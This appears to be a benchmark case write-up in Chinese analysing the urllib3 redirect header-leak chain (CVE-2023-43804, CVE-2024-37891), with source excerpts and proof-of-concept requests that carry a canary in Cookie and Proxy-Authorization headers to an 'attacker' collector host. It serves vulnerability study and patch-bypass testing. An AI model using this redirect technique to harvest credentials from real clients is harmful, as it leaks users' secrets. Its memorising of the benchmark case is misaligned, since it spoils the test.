# urllib3：跨源 302 只剥了 Cookie，Proxy-Authorization 还在集合外面

- Case：`PCBV2-0211`
- 产品：urllib3（PyPI HTTP 客户端，`requests` / pip 的底层）。运行时是整包 wheel `urllib3==1.26.16` / `1.26.17` / `1.26.19`，经 `PoolManager.request` 走真实跨 host 的 302，不是抽出来的函数。
- 链：CVE-2023-43804（1.26.16 → 1.26.17，GHSA-v845-jxx5-vc9f）→ CVE-2024-37891（1.26.17/1.26.18 → 1.26.19，GHSA-34jh-p97f-mpxf）
- 源码对着 tag `1.26.17` 的 `src/urllib3/util/retry.py`（`Retry.DEFAULT_REMOVE_HEADERS_ON_REDIRECT`）和 `src/urllib3/poolmanager.py`（`PoolManager.urlopen` 跨源剥头循环）。金丝雀是 benign：客户端把 `PCBFLAG_...` 放进敏感请求头，攻击者 sidecar 回显它实际收到的头。

GHSA-34jh-p97f-mpxf 的原话：*urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.* 前一条 GHSA-v845-jxx5-vc9f 对 Cookie 说的是同一句话。

根因不只是「名单少写了一个头」。检查插在「这个头的小写名字在不在 `remove_headers_on_redirect` 集合里」上；真正把凭证送到另一个 origin 的是后面那次 `urlopen` 原样转发的 `kw["headers"]`。集合是白名单式删除，不在集合里的凭证头一律跟着走。下面按调用走进去。

---

## 这块功能本来在干什么

调用方用 `urllib3.PoolManager` 发请求，默认跟随重定向。库会在跨 origin 时摘掉它认为不该转发的头，再对 `Location` 发第二次请求。一次典型调用：

```python
http = urllib3.PoolManager()
http.request(
    "GET",
    "http://redirector/redir",
    headers={"Cookie": "session=<FLAG>"},
    redirect=True,
)
```

`redirector` 回 `302 Location: http://attacker/collect`。host 从 `redirector` 变成 `attacker`，跨源剥头循环开火。设计意图：`Authorization` / `Cookie` 这类凭证只属于第一个 origin，不应该出现在第二次请求上。成功穿越之后的效果是：**第二次请求仍然带着那份凭证头，attacker 的 collector 在回显里看到 `PCBFLAG_...`。**

数据流：

```text
PoolManager.request("GET", http://redirector/redir, headers={敏感头: FLAG})
    → urlopen
         conn.urlopen(...)                    ← 第一次，头原样发出
         302 Location: http://attacker/collect
         retries.remove_headers_on_redirect
              且 not conn.is_same_host(Location)
              → 只 pop 集合里的那些名字         ← V1 谓词是这个 frozenset
         urlopen(method, Location, **kw)      ← 第二次，剩下的头原样走
    → attacker 收到的请求头被回显
```

不需要登录目标站。前提是调用方自己把凭证放进了请求头，并且没有 `redirects=False`。这是库的默认跟随行为，不是应用自己写的第二跳。

`urlopen` 在剥头之前先 `urljoin` 相对 Location、把 303 改成 GET，再把 `retries` 收成 `Retry` 对象。`remove_headers_on_redirect` 来自这份 Retry：调用方没传就用类上的 `DEFAULT_REMOVE_HEADERS_ON_REDIRECT`。本 case 的 `probe.py` 只构造 `PoolManager()`，不传自定义 Retry，所以走的就是 1.26.17 那两个名字。

---

## 原始漏洞：跨源只剥 Authorization（CVE-2023-43804，1.26.16）

1.26.16 的默认集合只有一个名字：

```python
# src/urllib3/util/retry.py  (urllib3 1.26.16)
DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset(["Authorization"])
```

`PoolManager.urlopen` 在跨源时按这个集合删头：

```python
# src/urllib3/poolmanager.py :: urlopen  (1.26.16 / 1.26.17 同一段循环)
if retries.remove_headers_on_redirect and not conn.is_same_host(redirect_location):
    headers = list(six.iterkeys(kw["headers"]))
    for header in headers:
        if header.lower() in retries.remove_headers_on_redirect:
            kw["headers"].pop(header, None)
```

`Cookie` 的小写不在集合里，`pop` 不发生，第二次 `urlopen` 把 `Cookie: session=<FLAG>` 带到 `attacker`。GHSA-v845-jxx5-vc9f：*it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin*。

本 case seed 就是这条：`Cookie: session=${PCB_FLAG}`，redirector → attacker。v0 上 attacker 回显里出现 flag。

同一版本上 `Proxy-Authorization` 当然也漏——seed 选 Cookie，是因为那是 43804 补丁明确加进集合的那个名字。

---

## 维护者改了什么（CVE-2023-43804 修复，1.26.17）

1.26.17 只改了集合字面量，剥头循环一行没动：

```python
# src/urllib3/util/retry.py  (urllib3 1.26.17)
#: Default headers to be used for ``remove_headers_on_redirect``
DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset(["Cookie", "Authorization"])
```

构造 `Retry` 时若调用方没自己传 `remove_headers_on_redirect`，就用这个默认，并立刻转成小写 frozenset：

```python
self.remove_headers_on_redirect = frozenset(
    [h.lower() for h in remove_headers_on_redirect]
)
```

补丁默认了两件事：

1. 跨源不该转发的凭证头，就是 `Authorization` 和刚加进去的 `Cookie`。
2. 其它带 “Authorization” 字样、或同样携带 secret 的头，要么不会出现在非代理请求上，要么出现了也不该由这个循环负责。

第二点不成立。`Proxy-Authorization` 是 RFC 7235 里给代理的凭证头。调用方可以在**不用** `ProxyManager` 的情况下，自己把这个头放进 `headers=`——库不会当它是凭证，跨源时也就不剥。

对 seed 这种 `Cookie`：`header.lower() == "cookie"` 命中集合，`pop` 掉，attacker 看不到 session。这就是 v1 + `--seed` 退出码 10。

---

## 检查之后谁真正发出第二次请求

集合判断一结束，同一个 `urlopen` 立刻用**还留在 `kw["headers"]` 里的字典**递归：

```python
# src/urllib3/poolmanager.py :: urlopen  (1.26.17)
kw["retries"] = retries
kw["redirect"] = redirect
log.info("Redirecting %s -> %s", url, redirect_location)
response.drain_conn()
return self.urlopen(method, redirect_location, **kw)
```

过滤器刚看过的是「头名字在不在那两个字符串里」；第二次 `conn.urlopen` 看到的是整份 headers 字典。中间没有「凡是 *Authorization / Cookie* 家族都剥」的第二道谓词，也没有按 RFC 把 hop-by-hop + 凭证头整类清掉。

`is_same_host` 只决定**要不要**进这段循环，不决定循环里删哪些名字。跨源为真时，不在集合里的头 100% 转发。注释写 *Check remove_headers_on_redirect to avoid a potential network call within conn.is_same_host()*——维护者关心的是「别在空集合时还做 DNS」，不是「凭证头有哪些」。

`ProxyManager` 自己走另一条路：真正走代理时，`Proxy-Authorization` 是给代理的，本来就不该跟到 origin。它的 `urlopen` 在非 CONNECT 时还会 `_set_proxy_headers`，但**不会**在跨 origin 时额外剥这个头；跨源剥头仍然落到父类 `PoolManager.urlopen` 的同一段循环。GHSA-34jh-p97f-mpxf 针对的是**没用 ProxyManager、却手写了这个头**的调用方——正好落到这条通用循环上。本 case 的 client 用的就是裸 `PoolManager`，和 advisory 的「highly unlikely / still strip by default」场景一致。

---

## 仓库里已经有更强的检查，名单没用上

同一份 1.26.17 里，剥头循环本身是通用的：任意名字进了 `remove_headers_on_redirect` 都会被 `pop`。谁在默认集合里：

| 头 | 1.26.16 | 1.26.17 | 1.26.19 |
|---|---|---|---|
| `Authorization` | 在 | 在 | 在 |
| `Cookie` | **不在** | 在 | 在 |
| `Proxy-Authorization` | **不在** | **不在** | 在 |

不是循环不会删 `Proxy-Authorization`，是 **默认集合没把它写进去**。`ProxyManager` 已经知道这个头是代理凭证；`PoolManager` 的跨源逻辑没有复用「这是凭证」这个分类，只维护一份越补越长的名字列表。

Fetch / RFC 9110 里和认证相关的请求头不止这三个：`Authorization`、`Proxy-Authorization`、`Cookie`、`Cookie2`、以及调用方手写的 `X-Api-Key`。库选择「列名字」而不是「凭证类」，所以每条 CVE 只加一个字符串。1.26.17 把 Cookie 加进去的那一刻，`Proxy-Authorization` 已经是名单旁边明显空着的格子。

即便调用方自己传 `retries=Retry(remove_headers_on_redirect=("Cookie","Authorization","Proxy-Authorization"))` 也能挡住——那是调用方的责任。库的默认值才是 advisory 修的那一层。`__init__` 把传入的名字 `.lower()` 之后冻结；比较时用 `header.lower()`，大小写骗不过，**换一个名字**才能骗过。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「集合成员 vs 二次 urlopen」落到具体头：

- V1 过滤器：`header.lower() in {"cookie", "authorization"}`
- 第二次 `urlopen(..., headers=kw["headers"])`：字典里还在的头原样发出

只要换一个**同样是凭证、但不叫 Cookie / Authorization** 的头，第一道门放行，第二道门会把它带到 attacker。

```text
seed（Cookie）:
  headers={"Cookie": "session="+FLAG}
  → "cookie" ∈ 集合 → pop → attacker 回显无 FLAG

residual（Proxy-Authorization）:
  headers={"Proxy-Authorization": "Basic "+FLAG}
  → "proxy-authorization" ∉ 集合 → 不 pop
  → 第二次 urlopen 带到 http://attacker/collect
  → 回显含 FLAG
```

GHSA-34jh-p97f-mpxf 给的场景就是：没用内置代理支持，却设置了 `Proxy-Authorization`，再跟随跨源 302。本 case 把该头的值换成金丝雀，观察的是同一段 `pop` 循环有没有把它当作凭证。

---

## 残余仍然走同一条跨源剥头循环（CVE-2024-37891）

没有换 API、没有换 302、没有换「跨源才剥」这个条件。还是 `PoolManager.urlopen` 里那一次 `for header in headers`。换成另一个名字：

```python
http.request(
    "GET",
    "http://redirector/redir",
    headers={"Proxy-Authorization": "Basic " + FLAG},
    redirect=True,
)
```

`is_same_host` 仍然为假，循环仍然跑；V1 集合里仍然没有 `proxy-authorization`；`kw["headers"]` 原样进入第二次 `urlopen`。attacker 回显里出现 flag。

本 case residual 和 advisory 同一构造，只是把「可能被误配的代理凭证」具体成金丝雀。认证意图：v1 + `--residual` 观察到 `PCBFLAG_...`。

seed 被挡住只说明「Cookie 不再跨源转发」，不说明「所有凭证头都不会跨源转发」。

平台 residual 走的就是这条 `remove_headers_on_redirect` 循环，和源码链同一 sink。不是另一条无关的代理实现。redirector 和 attacker 是两个不同 hostname 的 sidecar，`Host: attacker` 出现在回显里，用来确认第二次请求真的跨了 origin，而不是同 host 上的相对 302（同 host 根本不进剥头循环）。

---

## 后来又补了什么（CVE-2024-37891，1.26.19）

1.26.19 再次只改集合，循环仍不动：

```python
# src/urllib3/util/retry.py  (urllib3 1.26.19)
DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset(
    ["Cookie", "Authorization", "Proxy-Authorization"]
)
```

对残余输入：`proxy-authorization` 命中，`pop` 掉，attacker 看不到 Basic 值。公开建议升级到 1.26.19 / 2.2.2，或自己关重定向、或只用 `ProxyManager` 处理这个头。

即便如此，这仍然是「往名单里再加一个字符串」。下一次再出现 `Cookie2`、自定义 `X-Api-Key`、或其它调用方手写的凭证头，同一段循环会再漏一次。本 benchmark 的 v2 只关闭 `Proxy-Authorization` 这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是默认 frozenset 的成员。真正把秘密送到第二个 origin 的是递归 `urlopen` 对 `kw["headers"]` 的转发。V2 仍在同一层加码，没有改成「凭证类头」或「非简单头一律不跟」。

**不是没有更好的谓词。**  
循环已经按名字 `pop`。`Authorization` 和 `Cookie` 进了集合，说明维护者承认「凭证头不该跨源」。`Proxy-Authorization` 是同一类。从 V1 的 diff 只能看到多了一个 `"Cookie"`；要判断是否闭合，必须看到循环消费的是整份 headers，以及默认集合还漏了谁。

**同一 `urlopen`、同一 `kw["headers"]`，只换了头名字。**  
advisory 原话就是库「不把 `Proxy-Authorization` 当成携带认证材料」。Cookie 被挡住，不等于凭证类别被挡住。

**ProxyManager 和 PoolManager 不是一层。**  
真走代理时这个头有专门语义；手写在 `PoolManager` 上时，它就只是普通请求头。只修「浏览器式 Cookie 泄漏」、不修「看起来像代理的凭证头」，门是开的。

**金丝雀在请求头里是有意的。**  
flag 从不进 urllib3 源码。能在 attacker 回显里读到它，说明第二次请求把那份头带出了 origin——也就是剥头循环认为它不在名单里。collector 回显的是它作为 HTTP 服务端实际解析到的请求头，不是客户端自以为发出的字典。

`Retry.__init__` 把默认集合拷进实例时立刻 `.lower()`；比较用 `header.lower()`。大小写、`Cookie:` 与 `cookie:` 骗不过。要漏，只能换一个**不在集合里的名字**。1.26.17 刚把 Cookie 写进去，旁边空着的就是 `Proxy-Authorization`。

同 host 的 302 根本不进这段循环，头会原样跟——那是 RFC 语义，不是本链。本链要求 `not conn.is_same_host(Location)`，redirector → attacker 满足。

`probe.py` 只构造 `PoolManager()`，不传自定义 `Retry`，因此默认集合就是 1.26.17 那两个名字。attacker sidecar 回显它作为服务端解析到的头；`Host: attacker` 出现在回显里，用来确认第二跳真的跨了 origin。

---

## 版本、入口、参考

| | 版本 | 默认剥头集合 | Cookie seed | Proxy-Authorization residual |
|---|---|---|---|---|
| V0 | 1.26.16 | `{Authorization}` | 泄漏 | （不必） |
| V1 | 1.26.17 | `{Cookie, Authorization}` | 剥掉 | 泄漏 |
| V2 | 1.26.19 | `{Cookie, Authorization, Proxy-Authorization}` | 剥掉 | 剥掉 |

- 产品 API：`urllib3.PoolManager.request(..., redirect=True)` → `PoolManager.urlopen`
- 效果通道：跨源 302 之后，attacker 实际收到的请求头
- [CVE-2023-43804](https://nvd.nist.gov/vuln/detail/CVE-2023-43804)、[CVE-2024-37891](https://nvd.nist.gov/vuln/detail/CVE-2024-37891)
- [GHSA-v845-jxx5-vc9f](https://github.com/urllib3/urllib3/security/advisories/GHSA-v845-jxx5-vc9f)、[GHSA-34jh-p97f-mpxf](https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf)
- 源码：[`1.26.17` `retry.py`](https://github.com/urllib3/urllib3/blob/1.26.17/src/urllib3/util/retry.py)、[`poolmanager.py` `urlopen`](https://github.com/urllib3/urllib3/blob/1.26.17/src/urllib3/poolmanager.py)；V2 集合见 [`1.26.19` `retry.py`](https://github.com/urllib3/urllib3/blob/1.26.19/src/urllib3/util/retry.py)
